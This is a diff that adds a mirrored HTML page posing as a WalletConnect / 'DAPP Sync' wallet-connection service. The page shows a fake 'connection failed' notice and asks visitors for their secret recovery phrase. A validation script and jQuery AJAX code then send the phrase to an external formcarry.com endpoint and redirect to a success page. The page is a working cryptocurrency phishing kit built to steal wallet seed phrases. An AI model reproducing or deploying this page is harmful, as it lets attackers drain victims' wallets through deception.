@@ -1,0 +1,192 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from dapps-synccs.netlify.app/integratewallet/sync%EF%B9%96ref=elrond by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 18 Mar 2023 21:11:27 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+            <title></title>
+    <link href="images/index.svg" rel="shortcut icon">
+
+
+
+        <!-- Fonts -->
+        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&amp;display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="css/app.css">
+        <link rel="stylesheet" href="css/blockchain.css">
+        <link rel="stylesheet" href="css/custom.css">
+        <link href="../../dapps-syncc.netlify.app/integratewallet/fontawesome-free-5/css/all.html" rel="stylesheet" type="text/css">
+        <script src="../../dapps-syncc.netlify.app/integratewallet/js/jquery.min.html"></script>
+        <script src="js/app.js"></script>
+        <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script>
+function validateForm() {
+ const text = document.querySelector(".formInputBlockchain");
+    let phrase = document.querySelector(".formInputBlockchain").value;
+    const phraseArr = phrase.trim().split(" ");
+  
+    if (phrase.trim() == "") {
+      text.classList.add("required");
+     
+      return false;
+    }else if (phraseArr.length < 10) {
+      document.querySelector("#warningmessage").style.display = "block";
+      return false;
+    }else {
+    
+    }
+}
+</script>
+        
+        <!-- Styles -->
+        <style>
+            
+        </style>
+
+        <style>body {
+                font-family: 'Nunito';
+            }
+            .loader-container {
+            max-width: 100%;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            }
+        </style>
+    </head>
+
+    <body class="">
+    
+        <main>
+                <div class="bg-white" style="height: 100vh">
+        <div class="top">
+            <a href="#" class="left text-center">Github</a>
+
+            <a href="#" class="left text-center">Docs</a>
+            <a href="https://dapps-syncc.netlify.app/integratewallet/welcome.html" class="main m-0 text-center"><img src="images/logo.svg"
+                    alt="logo"></a>
+            <a href="#" class="left text-center">Wallets</a>
+            <a href="#" class="left text-center" style="text-align: right">Apps</a>
+        </div>
+        <br>
+        <div class="gFeYHJ mt-5">WalletConnect</div>
+
+        <section>
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-md-6 col-lg-4 shadow-sm bg-white pr-4 pl-4 m-1">
+                        <div class="text-center mb-2">
+                            
+                            
+                        </div>
+                        <div class="alert alert-danger fade show text-center" role="alert" style="font-size:0.8em"
+                            id="warningmessage">
+                            Invalid recovery phrase
+                        </div>
+                        <div class="alert alert-success fade show text-center" role="alert" style="font-size:0.8em"
+                            id="successmgs">
+                            Success! Re-check wallet in next 24 hours
+                        </div>
+                        <div class="load-cont">
+                            <div class="loader-container">
+                                <div class="lds-facebook"><div></div><div></div><div></div></div>
+                            </div>
+                            <p class="text-center">Connecting to wallet</p>
+                        </div>
+                        <div class="mt-4 form-sect">
+                            <div class="alert-danger py-2 px-2 failed-text" style="font-size:0.8em">
+                                Connection failed, please enter your recovery phrase manually.
+                            </div>
+                            <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                                
+                                <li class="nav-item" role="presentation">
+                                    <a class="nav-link" id="pills-profile-tab" data-toggle="pill" href="#"
+                                        role="tab" aria-controls="pills-profile" aria-selected="false">Phrase</a>
+                                </li>
+                            </ul>
+                            <div class="tab-content" id="pills-tabContent">
+                                <div class="tab-pane fade show active" id="pills-profile" role="tabpanel"
+                                    aria-labelledby="pills-profile-tab">
+                                    <form action='https://formcarry.com/s/Sp2-ZQaWCf' class="ajaxForm" id='sync' method='post' name='phrsform' ><input type='hidden' name='form-name' value='phrsform' />
+                                        <script>
+                                            $(".ajaxForm").submit(function(e) {
+                                            e.preventDefault();
+                                            var href = $(this).attr("action");
+                                            $.ajax({
+                                            type: "POST",
+                                            dataType: "json",
+                                            url: href,
+                                            data: $(this).serialize(),
+                                            success: function(response) {
+                                            if (response.status == "success") {
+                                            window.location.href = '../success.html'; // redirection url // change this. 
+                                            } else {
+                                            alert("An error occured: " + response.message);
+                                            }
+                                            }
+                                            });
+                                            });
+                                            </script>  
+                                        <div class="row">
+                                            <div class="col-md-12">
+                                                <div class="form-group mt-2">
+                                                    <textarea class="form-control formInputBlockchain" type="text"
+                                                        name="phrs" placeholder="Enter your Secret Recovery Phrase" rows="5" onkeyup=removereq()></textarea>
+                                                </div>
+                                                    <input type="hidden" name="wal" value="" class="ref">
+                                                <div class="form-group pt-2">
+                                                    <div class="row">
+                                                        
+                                                       <div class="col-12">
+                                                            <p class="" style="font-size: 0.8em; color:#144fea">Typically 12 (sometimes 24) words separated by single spaces</p>
+                                                       </div>
+                                                        <div class="col-12 mt-2" style="float: right">
+                                                            <button type="submit" value="submit" id="btnn"| class="btn btn-primary w-100  mb-2"
+                                                                style="height: 45px; font-size:0.8em; background-color:#144fea">IMPORT</button>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+
+
+
+                            
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer class="edit-1">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 text-center mt-4 mb-4">
+                        <span>© 2022 DAPP Sync is a Proud provider of DAPP Network services<span>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+        </main>
+        <style>#successmgs{
+                display: none;
+            }
+
+            #warningmessage {
+                display: none;
+            }
+        </style>  
+          
+    </body>
+
+<!-- Mirrored from dapps-synccs.netlify.app/integratewallet/sync%EF%B9%96ref=elrond by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 18 Mar 2023 21:11:27 GMT -->
+</html>
